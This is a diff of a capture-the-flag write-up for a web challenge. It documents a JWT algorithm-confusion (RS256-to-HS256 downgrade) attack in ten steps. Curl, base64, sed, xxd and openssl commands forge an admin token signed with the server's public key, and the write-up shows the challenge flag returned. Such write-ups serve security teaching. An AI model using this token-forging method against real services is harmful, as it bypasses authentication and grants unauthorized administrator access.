@@ -1,5 +1,14 @@
 # Web Challenge 3: Unlock Me
 
+## Overview/TLDR
+1. Modify the JWT Header and Payload (received when logging in from the endpoint ```/login```)
+2. Conduct a [JWT Downgrade attack](https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/)
+2. Send a GET request specifying the resigned JWT as the Bearer token to the endpoint ```/unlock``` to get the flag
+
+There are easier and faster ways of conducting a JWT Downgrade Attack, such as using a Python library such as [PyJWT](https://pyjwt.readthedocs.io/en/stable/) to encode and resign a JWT, however, to fully understand each step and procedure that goes behind the scenes of this attack and JWT authentication, we've decided to perform the attack manually, step by step.
+
+> We automated the whole process using a Bash script at the [Bonus](#bonus) section
+
 ## Challenge Description
 ![Challenge Desciption](pics/challenge_desc.jpg)
 
@@ -91,20 +100,21 @@ Things to note before conducting a JWT Downgrade Attack
 
 The [JWT Downgrade Attack](https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/) works by tricking the target's JWT processing to accept a symmetrically signed token (HS256) instead of an asymmetrically signed one (RS256). This works for vulnerable endpoints that uses its public key (which we have) to verify the JWT in a symmetric fashion.
 
-| **Step** | **Explanation**                                                                                                                                                                                                                                                                                           |
-|----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| 1        | Retrieve a JWT |
-| 2        | Base64Url decode and modify the algorithm specified in the JWT Header to ```HS256```, then Base64Url encode the result |
-| 3        | Base64Url decode and modify the "role" specified in the JWT Payload to ```admin```, then Base64Url encode the result| 
-| 4        | Piece together the Base64Url encoded JWT Header and Payload, separating the header and payload with a dot (.), and we're now ready to sign this token with the target's public key|
-| 5        | Retrieve and save the public key from ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem```                                                                                                                                                                                        |
-| 6        | Convert the public key into an ASCII hex HMAC |
-| 7        | Sign the token from **Step 4** using the result from **Step 6**. This will result in an ASCII hex HMAC Signature|
-| 8| Encode the ASCII hex HMAC Signature from **Step 7**. The result will be the JWT Signature (third section) of your new JWT|
-| 9 | Piece together your JWT, appending the JWT Signature from **Step 8** to your JWT Header and JWT Payload|
-| 10 | Submit the token as a Bearer token to the endpoint ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock``` and retrieve the flag!|
+| **Step** | **Explanation**                                                                                                                                                                    |
+|----------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| 1        | Retrieve a JWT                                                                                                                                                                     |
+| 2        | Base64Url decode and modify the algorithm specified in the JWT Header to ```HS256```, then Base64Url encode the result                                                             |
+| 3        | Base64Url decode and modify the "role" specified in the JWT Payload to ```admin```, then Base64Url encode the result                                                               |
+| 4        | Piece together the Base64Url encoded JWT Header and Payload, separating the header and payload with a dot (.), and we're now ready to sign this token with the target's public key |
+| 5        | Retrieve and save the public key from ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem```                                                                 |
+| 6        | Convert the public key into an ASCII hex HMAC                                                                                                                                      |
+| 7        | Sign the token from **Step 4** using the result from **Step 6**. This will result in an ASCII hex HMAC Signature                                                                   |
+| 8        | Encode the ASCII hex HMAC Signature from **Step 7**. The result will be the JWT Signature (third section) of your new JWT                                                          |
+| 9        | Piece together your JWT, appending the JWT Signature from **Step 8** to your JWT Header and JWT Payload                                                                            |
+| 10       | Submit the token as a Bearer token to the endpoint ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock``` and retrieve the flag!                                 |
 
 #### Step 1
+Retrieve a JWT
 ```bash
 redfl4g@kali$ curl -X POST -H "content-type: application/json" -d '{"username":"minion", "password":"banana"}' http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login
 
@@ -112,6 +122,7 @@ redfl4g@kali$ curl -X POST -H "content-type: application/json" -d '{"username":"
 ```
 
 #### Step 2
+Base64Url decode and modify the algorithm specified in the JWT Header to ```HS256```, then Base64Url encode the result
 ```bash
 redfl4g@kali$ echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" |  base64 -d | sed 's/+/-/g; s/\//_/g; s/RS256/HS256/g';
 
@@ -122,6 +133,7 @@ Use an online Base64Url encoder to encode the modified JWT header to get ```eyJh
 ![Header B64Url encode](pics/b64url_encode.jpg)
 
 #### Step 3
+Base64Url decode and modify the "role" specified in the JWT Payload to ```admin```, then Base64Url encode the result
 ```bash
 redfl4g@kali$  echo "eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDI0MjAxfQ" |  base64 -d | sed 's/+/-/g; s/\//_/g; s/:"user/:"admin/g';
 
@@ -132,15 +144,17 @@ Use an online Base64Url encoder to encode the modified JWT payload to get ```eyJ
 ![Payload B64Url encode](pics/b64url_encode2.jpg)
 
 #### Step 4 
-Base64Url encoded JWT Header and Payload
+Piece together the Base64Url encoded JWT Header and Payload, separating the header and payload with a dot (.), and we're now ready to sign this token with the target's public key
 - ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0```
 
 #### Step 5
+Retrieve and save the public key from ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem```
 ```bash
 redfl4g@kali$ wget http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem
 ```
 
 #### Step 6
+Convert the public key into an ASCII hex HMAC
 ```bash
 redfl4g@kali$ cat public.pem | xxd -p | tr -d "\\n"
 
@@ -148,6 +162,7 @@ redfl4g@kali$ cat public.pem | xxd -p | tr -d "\\n"
 ```
 
 #### Step 7
+Sign the token from **Step 4** using the result from **Step 6**. This will result in an ASCII hex HMAC Signature
 ```bash
 redfl4g@kali$ echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n")
 
@@ -155,6 +170,7 @@ redfl4g@kali$ echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1p
 ```
 
 #### Step 8
+Encode the ASCII hex HMAC Signature from **Step 7**. The result will be the JWT Signature (third section) of your new JWT
 ```bash
 redfl4g@kali$ python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('2d2912499e8b63e86d73bbe51f76deca6f896939d1afc7a05337eded412310d4')).replace('=','')\")"
 
@@ -163,16 +179,17 @@ LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ
 
 
 #### Step 9
-Signed and modified JWT Token
+Piece together your JWT, appending the JWT Signature from **Step 8** to your JWT Header and JWT Payload
 - ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ```
 
 #### Step 10
+Submit the token as a Bearer token to the endpoint ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock``` and retrieve the flag!
 ```bash
 redfl4g@kali$ curl -X GET -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
 
 {"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
 ```
-> Note: The "iat" parameter specified in the JWT Payload is an ["Issued at" Claim](https://tools.ietf.org/html/rfc7519#page-10). This means that there is a possibility that JWT tokens are also verified based on their age, and can expire, thereby invalidating the token 
+> Note: The "iat" parameter specified in the JWT Payload is an ["Issued at" Claim](https://tools.ietf.org/html/rfc7519#page-10). This means that there is a possibility that JWT tokens are also verified based on their age, and can expire, thereby invalidating the token. This also means that, as the "iat" time changes, so will the JWT signature, because of the SHA256 hashing algorithm used in HS256 (and RS256).
 
 <br>
 
@@ -243,3 +260,4 @@ Signed Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsI
 
 {"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
 ```
+
